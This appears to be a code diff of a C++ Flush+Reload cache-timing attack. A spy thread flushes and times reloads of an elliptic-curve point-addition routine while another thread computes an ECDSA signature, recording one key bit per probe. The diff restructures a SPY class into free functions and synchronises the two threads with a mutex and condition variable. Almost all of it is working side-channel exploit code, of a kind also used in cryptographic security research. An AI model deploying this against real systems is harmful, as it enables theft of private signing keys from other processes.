@@ -2,25 +2,21 @@
 void* addr_Pmul = (void*)&EllPoint::MulP;
 void* addr_Padd = (void*)&EllPoint::Add;
 void* addr_Pdoub = (void*)&EllPoint::Pdouble;
-SPY::SPY()
-{
-    flush_reload_threshold = get_FlushReload_time();
-}
-SPY::~SPY(){}
-inline void SPY::maceess(void* addr)
+
+inline void maceess(void* addr)
 {
 	asm volatile("mfence");
 	asm volatile("movl (%0),%%eax \n" : :"c"(addr):"%eax");
 	asm volatile("mfence");
 }
-inline void SPY::flush(void* addr)
+inline void flush(void* addr)
 {
 	asm volatile("mfence");
 	asm volatile("clflush 0(%0) \n" : :"c"(addr));
 	asm volatile("mfence");
 
 }
-inline unsigned long long int SPY::rdtsc()
+inline unsigned long long int rdtsc()
 {
 	unsigned long long int a=0;
 	asm volatile("mfence");
@@ -28,13 +24,13 @@ inline unsigned long long int SPY::rdtsc()
 	asm volatile("mfence");
 	return a;
 }
-unsigned long long int SPY::get_FlushReload_time()
+unsigned long long int get_FlushReload_time()
 {
 	unsigned long long int start,end,reload_time,flush_time;
 	reload_time=0;
 	flush_time=0;
 	int a[16];
-	void* addr=(void*)a;
+	void* addr=addr_Padd;
 	unsigned long long int count =10000;
 	maceess(addr);
 	for(int i=0;i<count;i++)
@@ -58,7 +54,7 @@ unsigned long long int SPY::get_FlushReload_time()
 	printf("reload:%llu,flush:%llu\n",reload_time,flush_time);
 	return (reload_time+flush_time)/2;
 }
-bool SPY::flush_reload(void* addr)
+bool flush_reload(void* addr)
 {
     unsigned long long int start,end;
         start = rdtsc();
@@ -75,88 +71,59 @@ bool SPY::flush_reload(void* addr)
 }
 
 
-SPY spy;
-char key[512];
 void* spyth(void* arg)
 {
-//	while(!Stop_spy)
-//	{
-		while(!spy.flush_reload(addr_Pmul))
-		{
-			spy.flush(addr_Pmul);
-		}
-		int i = 1;
-		key[0] = 9;
+		int i = 0;
 		while(!Stop_spy)
 		{
-			if(spy.flush_reload(addr_Pdoub))
+			pthread_mutex_lock(&mutex);
+			while(alternate)
 			{
-				if(spy.flush_reload(addr_Padd))
-				{
-					key[i]=1;
-				}
-				else
-				{
-					key[i]=0;
-				}
-				i++;
+				pthread_cond_wait(&cond,&mutex);
 			}
-			spy.flush(addr_Padd);
-			spy.flush(addr_Pdoub);
+			if(flush_reload(addr_Padd))
+			{
+				printf("1 ");
+				key[i]='1';
+			}
+			else
+			{
+				printf("0 ");
+				key[i]='0';
+			}
+			i++;
+			flush(addr_Padd);
 			if(i>500){break;}
+			alternate =1;
+			pthread_mutex_unlock(&mutex);
+			pthread_cond_signal(&cond);
+			printf("spyth %d\n ",i);
 		}
-		key[i]=2;
+		
+		key[i]=0;
+		return 0;
 //	}
 }
+SignGen sign;
+void* signth(void* arg)
+{
+	sign.Ecdsa_sign_gen("insada");
+	Stop_spy =1;
+	return 0;
+}
+
 void Spytest()
 {
 	pthread_t spy_thread; 
-	SignGen sign;
+	pthread_t sign_thread;
+	flush_reload_threshold = get_FlushReload_time();
 	
 	pthread_create(&spy_thread,NULL,spyth, NULL);
-	
-	sign.Ecdsa_sign_gen("insada");
-	Stop_spy =1;
-//	pthread_exit(NULL);
-	int i=0;
-	while(key[i]!=2&&i<500)
-	{
-		printf("%d",key[i]);
-		i++;
-	}
-		printf("\n%d\n",i);
-	spy.flush(addr_Pdoub);
-	spy.flush(addr_Padd);
+	pthread_create(&sign_thread,NULL,signth, NULL);
+	pthread_join(sign_thread,NULL);
+	pthread_join(spy_thread,NULL);
+	printf("\n%s\n",key);
+	flush(addr_Pdoub);
+	flush(addr_Padd);
 }
-/*
-unsigned long probe_time(void* addr)
-{
-	volatile unsigned long time;
-	volatile unsigned long* time1;
-	asm __volatile__ (
-		"mfence      \n"
-		"lfence      \n"
-		"rdtsc       \n"
-		"lfence      \n"
-		"movl %%eax , %1 \n"
-		"movl (%2) ,  %%eax \n"
-		"lfence      \n"
-		"rdtsc       \n"
-		//"subl %%esi %%eax \n"
-		"clflush 0(%2)  \n"
-		: "=a" (time) ,"=r"(time1)
-		: "r" (addr)
-		: "%edx" 
-	);
-	return time - *time1;// & 0x00000000ffffffff);//-(unsigned long)time1;
-}
-unsigned long long rdtsca()
-{
-	unsigned long a,d;
-	asm __volatile__ ("mfence");
-	asm __volatile__ ("rdtsc" : "=a" (a) ,"=d"(d));
-	a = (d<<32)|a;
-	asm __volatile__ ("mfence");
-	return a;
-}
-*/
+
